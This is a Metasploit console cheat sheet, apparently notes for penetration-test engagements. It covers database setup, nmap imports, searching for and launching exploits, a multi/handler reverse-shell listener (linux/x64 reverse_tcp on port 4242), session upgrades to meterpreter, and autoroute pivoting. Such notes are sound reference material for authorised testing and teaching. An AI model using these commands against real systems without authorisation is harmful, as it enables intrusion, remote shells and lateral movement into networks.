# Create a new workspace for an engagement
workspace -a <Engagement_Name>

# Switch to a workspace
workspace <Engagement_Name>

# Initialize Database (outside msfconsole)
msfdb init
;; note that after you might need to add some pgsql executables to the PATH
;; they generally reside in /usr/lib/postgresql$version/bin/
;; hence something like: export PATH=$PATH:/usr/lib/postgresql/9.5/bin/

# Check db connection
db_status

# Import nmap scans
db_import /root/Documents/Project_Location/Engagement_Name/Internal/Site_10.*.*.0_*/nmap_scans/Port_Scan/*.xml

# Show open services
services -c port,name -u -o /tmp/ports
cat /tmp/ports | cut -d , -f2,3 | sort | uniq | tr -d \" | grep -v -E 'port|tcpwrapped' | sort -n


# See help
help

# Save everything that we do in a file
spool /tmp/msfconsole.log
spool off ;; to shut down the recording to a file

# Saving variables to a file
save

# Perform nmap scan and save results in DB
db_nmap -sV <ipaddress>

# Using metasploit as netcat
connect -C <ipaddress> <port>

# Search for Something
search <something>

# Search for Exploits 
search type:exploit <productstring>

# Search for Windows Exploits 
search type:exploit platform:windows <productstring>

# Search for Windows Exploits and filter results
grep <string> search type:exploit platform:windows

# To show all exploits for a specific vulnerability
grep <vulnerability> show exploits

# To select an exploit to use
use <exploit>

# To see the current settings for a selected exploit
show options
;; or
show options full

# To see compatible payloads for a selected exploit
show payloads

# To check advanced options and default payload
show advanced

# To set the payload for a selected exploit
set payload <payload>

# To set setting for a selected module 
set <option> <value>

# To set setting globally for a selected module 
setg <option> <value>

# To see a specific variable setting
get <option>

# View payload that has been set
get PAYLOAD

# To run the exploit
exploit

# To run the exploit in background (useful for multi/handler)
exploit -j

# List Sessions 
sessions

# Enter in session 2
sessions -i 2

# Kill session 1
sessions -k 1

# Kill all sessions
sessions -K

# Use a multi/handler reverse shell catcher
## Note that payload and reverse shell must match
## e.g., a meterpreter payload must have a listening meterpreter payload
use exploit/multi/handler
show payloads                           ;; show payloads
set payload linux/x64/shell/reverse_tcp ;; set the appropriate payload
set LHOST <network-interface>           ;; e.g., tun0 or wlan0
set LPORT 4242
exploit -j                              ;; wait for shell
jobs                                    ;; shows background jobs
;; once inside whatever shell, we can do
background (or ctrl+z)                  ;; sets the shell in  background

# Transform a generic reverse shell to a meterpreter shell
## This is equivalent to use post/multi/manage/shell_to_meterpreter
sessions -u <session-id>
;; or
use post/multi/manage/shell_to_meterpreter ;; set session <id> ;; run


# Other database commands
hosts
services
vulns


# Pivoting
run autoroute -h ;; show menu for autoroute

# Add a route for network 172.18.1.0/24
run autoroute -s 172.18.1.0 -n 255.255.255.0

# Saving current status
;; If we want to save our current commands so that we can simple restore
;; the status we can save the issued commands in an rc file by doing:
makerc <nameoftheoutputfile>
;; then we can load it by doing:
msfconsole -r <nameoftheoutputfile>
